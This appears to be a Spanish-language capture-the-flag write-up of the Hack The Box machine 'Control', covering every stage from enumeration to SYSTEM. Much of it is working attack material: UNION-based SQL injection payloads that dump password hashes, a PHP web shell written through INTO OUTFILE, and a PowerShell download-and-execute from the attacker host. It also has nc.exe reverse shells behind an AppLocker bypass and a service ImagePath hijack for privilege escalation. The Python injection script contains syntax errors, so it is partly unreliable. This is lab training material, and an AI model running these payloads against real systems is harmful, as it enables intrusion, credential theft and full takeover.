---
layout: post
title: HTB_Control
date: 2023/07/10
slug: HTB_Control
heroImage: /assets/machines.jpg
---

# Control {-}

## Introduccion {-}

La maquina del dia 25/08/2021 se llama Control.

El replay del live se puede ver aqui

[![S4vitaar Control maquina](https://img.youtube.com/vi/ig7wv4IdwiQ/0.jpg)](https://www.youtube.com/watch?v=ig7wv4IdwiQ)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.167
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.167
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.167 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,3306,49666,49667 10.10.10.167 -oN targeted
```


| Puerto | Servicio | Que se nos occure?   | Que falta? |
| ------ | -------- | -------------------- | ---------- |
| 80     | http     | Web, Fuzzing         |            |
| 135    | msrpc    |                      |            |
| 3306   | mysql    | SQLI                 |            |
| 49666  | msrpc    | puertos por defectos |            |
| 49667  | msrpc    | puertos por defectos |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.167
```

Nos enfrentamos a un Microsoft IIS 10.0 con PHP 7.3.7.

#### http-enum {-}

Lanzamos un web scan con nmap.

nmap --script http-enum -p80 10.10.10.167 -oN webScan

Nos detecta la routa 
```bash
 admin 
```


#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.167/FUZZ
```

Encontramos las routas 
```bash
 uploads 
```
, 
```bash
 admin 
```


### Analyzando la web con Firefox {-}

Entramos en una pagina, hay un boton admin en el menu y uno login.
Si miramos el codigo fuente vemos un comentario una Todo List:

- Import products
- Link to new payment system
- Enable SSL (Certificates location \\192.168.4.28\myfiles)

El ultimo en este caso es muy interesante.

Si pinchamos el link admin, vemos un mensaje **Acces Denied: Header Missing. Please ensure you go through the proxy to access this page**.
En este caso cuando se habla de proxy y de cabezera podemos uzar la heramienta **curl** con la cabezera **X-Forwarded-for**

### Cabezera proxy {-}

```bash
curl -s -X GET "http://10.10.10.167/admin.php" -H "X-Forwarded-For: 192.168.4.28"
```

Aqui vemos que nos a cargado una pagina.

```bash
curl -s -X GET "http://10.10.10.167/admin.php" -H "X-Forwarded-For: 192.168.4.28" | html2text
```

Como vemos informaciones interesantes, vamos a tirar de **burpsuite** para ver la informacion de manera normal.

### Añadir cabezera desde Burpsuite {-}

Una vez el burpsuite configurado con la maquina victima de target, vamos a añadir una cabezera. Lo podemos hacer de 2 maneras:

- Manual (cambiando de manera manual a cada peticion el header)
- Automatizada (que cada peticion use este header)

1. Pinchamos a Proxy > Options
1. Add Match and Replace


![Cotrol-bur-xforwardifor](/assets/images/Control-burp-xforwardingfor.png) 
1. Interceptamos y vemos que se añade la cabezera
1. Desactivamos el intersepte 

Ya podemos navegar de manera normal.

Vemos una pagina con productos y un input para buscar productos. Si escribimos un producto, aparece una tabla con un titulo **id**.

Probamos poner un apostrofe 
```bash
 ' 
```
 en el input de busqueda y nos sale un error SQL `Error SQLSTATE[42000] Syntax error or access violation You have an error in your SQL
syntax, check the manual that corresponds to your MariaDB server version for the right syntax to use near "'" at line 1`
## Vulnerability Assessment {-}


### SQL Injection Error Based con Python {-}

La idea aqui es crear un script en python que nos injecte el comando deseado y que filtre la respuesta al lado del servidor que 
queremos.

```python
#!/usr/bin/python3

import requests
import re
import signal
import sys
import time

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables_globales
sqli_url = "http://10.10.10.167/search_products.php"

def makeRequest(injection):
    post_data = {
        'productName: '%s' % injection
    }

    headers = {
        'X-Forwarded-For': '192.168.4.28'
    }

    r = requests.post(sqli_url, data=post_data, headers=headers)
    response = re.findall(r'\<tbody\>\r\n\t\t\t\t\t\t\t(.*?)\t\t\t\t\t\t\<\/tbody\>', r.text[0])

    print("\n + response + \n")


if __name__ == '__main__':
    while True:
        injection = input("[+] Payload: ")
        if injection != "exit":
            makeRequest(injection)
        else:
            print("\n[!] Saliendo...\n")
            sys.exit(0)

```

si lanzamos el script con 
```bash
 rlwrap python3 sqli_injection.py 
```
 y a la entrada payload le ponemos el apostrofe, podemos ver el error. Ya podemos enumerar
la base de datos.

1. Miramos cuantas columnas hay

    ```bash
    [+] Payload : ' order by 100-- -
    [+] Payload : ' order by 10-- -
    [+] Payload : ' order by 8-- -
    [+] Payload : ' order by 7-- -
    [+] Payload : ' order by 6-- -
    ```

    Al 
```bash
 ' order by 6-- - 
```
 nos sale No product Found, ya sabemos que hay 6 columnas

1. Aplicamos el union select

    ```bash
    [+] Payload : ' union select 1,2,3,4,5,6-- -
    ```

    Vemos que se estan colandos la etiquetas

1. Listamos la base de datos actual en uso y el usuario

    ```bash
    [+] Payload : ' union select 1,2,database(),4,5,6-- -
    [+] Payload : ' union select 1,2,version(),4,5,6-- -
    [+] Payload : ' union select 1,2,user(),4,5,6-- -
    ```

    La base de datos se llama warehouse de typo MariaDB version 10.4.8 y el usuario manager@localhost

1. Miramos si podemos leer archivos de la maquina victima

    ```bash
    [+] Payload : ' union select 1,2,load_file("C:\Windows\System32\drivers\etc\hosts"),4,5,6-- -
    [+] Payload : ' union select 1,2,load_file("Windows\System32\drivers\etc\hosts"),4,5,6-- -
    [+] Payload : ' union select 1,2,load_file("0x433a5c57696e646f77735c53797374656d33325c647269766572731b74635c686f737473"),4,5,6-- -
    ```

    Parece que no podemos leer ficheros del systema.

    > [ ! ] NOTAS: el hexadecimal se hace con el comando 
```bash
 echo "C:\Windows\System32\drivers\etc\hosts" | tr -d '\n' | xxd -ps | xargs | tr -d ' ' 
```


1. Enumeramos las tablas existentes de la base de datos

    ```bash
    [+] Payload : ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="warehouse"-- -
    ```

    Vemos que hay una tabla product, product_category y product_pack. No parece que haya informacion relevante.

1. Enumerar las bases de datos del systema

    ```bash
    [+] Payload : ' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
    ```

    Hay 3 bases de datos information_schema, mysql y warehouse.

1. Enumeramos la base de datos mysql

    ```bash
    [+] Payload : ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="mysql"-- -
    ```

    Hay muchas tablas y una es la tabla user

1. Enumeramos las columnas de la tabla user

    ```bash
    [+] Payload : ' union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema="mysql" and table_name="user"-- -
    ```

    Existe una columna user y una password

1. Accedemos a los usuarios y contraseñas de la base de datos

    ```bash
    [+] Payload : ' union select 1,2,group_concat(User,0x3a,Password),4,5,6 from mysql.user-- -
    ```

Copiamos los usuarios y la contraseñas en un fichero llamado hashes.

### Crackeamos las contraseñas con crackstation {-}

Tratamos las informaciones del fichero hash
 
```bash
cat hashes | tr ',' '\n' | sed 's/\*//g' | sort -u > hashes
cat hashes | awk '{print $2}' FS=":" | xclip -sel clip
```

Abrimos la web de [crackstation](https://crackstation.net/) y colamos los hashes. Encontramos las contraseñas de hector y de manager.

Aqui el problema es que no tenemos puertos que nos permite conectar a la maquina de manera directa. Tenemos que intentar otra cosa para 
poder ganar accesso al systema.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con SQL Injection {-}

Lo que vamos a intentar hacer, es escribir en un fichero usando la **SQLI**. Esto se puede hacer con el commando

```bash
 into outfile 
```
. Como savemos que la web es un IIS la routa por defecto de windows para hostear las webs de IIS es

```bash
 C:\inetpub\wwwroot 
```
 y hemos encontrado una routa 
```bash
 /uploads 
```
 intentamos ver si podemos escribir nuevos ficheros.

```bash
rlwrap python3 sqli_injection.py
[+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\test.txt-- -
[+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\\inetpub\\wwwroot\\uploads\\test.txt-- -
```

Si vamos a la url 
```bash
 http://10.10.10.167/uploads/test.txt 
```
 vemos el fichero creado. Intentamos injectar codigo malicioso

```bash
rlwrap python3 sqli_injection.py
[+] Payload : ' union select 1,2,"<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"; ?>",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\s4vishell.php-- -
```

Ya podemos comprobar que podemos ejecutar comandos en la url 
```bash
 http://10.10.10.167/uploads/s4vishell.php?cmd=whoami 
```
. 

Vamos a por ganar accesso al systema

1. Descargamos la nueva full TTY powershell

    ```bash
    git clone https://github.com/antonioCoco/ConPtyShell
    cd ConPtyShell
    stty size
    vi Invoke-ConPtyShell.ps1
    ```

1. Añadimos lo siguiente al final del fichero

    ```bash
    Invoke-ConPtyShell -RemoteIp 10.10.14.15 -RemotePort 443 -Rows 51 -Cols 189
    ```

1. Compartimos un servidor web con python

    ```bash`
    python3 -m http.server 80
    ``

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos y ejecutamos el ficher Invoke-ConPtyShell.ps1

    ```bash
    http://10.10.10.167/uploads/s4vishell.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString("http://10.10.14.15/Invoke-ConPtyShell.ps1")
    ```

Ya tenemos accesso al systema

### Tratamiento de la TTY {-}

```bash
^Z
stty raw -echo; fg
-> enter
-> enter

whoami
#output
error

cd C:\
#output
error
```

Los dos primeros commandos nos da un error pero a partir de aqui, ya tenemos una full tty shell.

### Enumerando el systema {-}

```bash
cd Users/
dir
cd Hector
dir
#Output
Error

cd ../Administrator
dir
#Output
Error
```

No tenemos derechos para entrar en los directorios de los Usuarios. Pero tenemos una contraseña para el usuario Hector.

### User pivoting al usuario hector {-}

Vemos si podemos lanzar commandos como el usuario hector.

```bash
hostname
#Output
Fidelity

$user = 'fidelity\hector'
$password = 'l33th4x0rhector'
$secpw = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCrendential $user,$secpw
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {whoami}
#Output
control\hector
```

Hemos podido lanzar un script enjaolado sobre un Blocke como si fuera el usuario hector que lo ejecutara.
La idea aqui es entablarnos una reverse shell ejecutada como el usuario hector.

1. Enviamos un nc.exe a la maquina victima

    - en la maquina de atacante

        ```bash
        locate nc.exe
        cp /usr/share/sqlninja/apps/nc.exe .
        impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
        ```

    - en la maquina victima

        ```bash
        cd C:\Windows\Temp
        mkdir userPivoting
        cd userPivoting
        net use x: \\10.10.14.15\smbFolder /user:s4vitar s4vitar123
        copy x:\nc.exe nc.exe
        ```

1. Lanzamos la reverse shell como el usuario hector

    - en la maquina de atacante

        ```bash
        rlwrap nc -nlvp 443
        ```

    - en la maquina victima

        ```bash
        Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {C:\Windows\Temp\userPivoting\nc.exe -e cmd 10.10.14.15 443 }
        ```

        tenemos un error, quiere decir que tenemos que passar por un **AppLockerByPass**. Las routas se pueden encontrar en [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md).

        ```bash
        cp nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
        C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443
        ```

Ya hemos ganado acceso al systema como el usuario hector y podemos ver la flag.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
whoami /priv
```

Como no tenemos posibilidades de escalar privilegios con un seImpersonatePrivilege por ejemplo, vamos a tener que enumerar el systema

```bash
cd C:\Windows\Temp
mkdir privesc
```

Descargamos el [**Winpeas.exe**](https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).
Cancelamos el recurso smb y creamos un nuevo para transferir el fichero.

```bash
mv /home/s4vitar/Descargas/winPEASx64.exe ./winpeas.exe
impacket-smbserver smbFolderr $(pwd) -smb2support -username s4vitar -password s4vitar123
```

y lo transferimos a la maquina victima

```bash
net use y: \\10.10.14.15\smbFolderr /user:s4vitar s4vitar123
copy y:\winpeas.exe winpeas.exe
dir
winpeas.exe
```

El winpeas.exe nos reporta que el usuario Hector tiene fullControl sobre bastante servicios, uno de ellos es el seclogon.


```{r, echo = FALSE, fig.cap="Hector service fullControl", out.width="90%"}
    knitr::include_graphics("images/Control-Hector-services-fullControl.png")

![Cotrol-Hector-services-fullCotrol](/assets/images/Control-Hector-services-fullControl.png) 
```bash
reg query "HKLM\system\currentcontrolset\services\seclogon"
```

```{r, echo = FALSE, fig.cap="service seclogon reg-expand-sz", out.width="90%"}
    knitr::include_graphics("images/Control-reg_expand_sz.png")
```

```bash
![Cotrol-re_exad_sz](/assets/images/Control-reg_expand_sz.png) 
reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443" /f
```

Ya podemos comprobar con el commando 
```bash
 reg query "HKLM\system\currentcontrolset\services\seclogon" 
```
 que el ImagePath a sido cambiado.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. arrancamos el servicio

    ```bash
    sc start seclogon
    ```

ya hemos ganado accesso al systema como 
```bash
 nt authority\system 
```
 y podemos leer la flag.
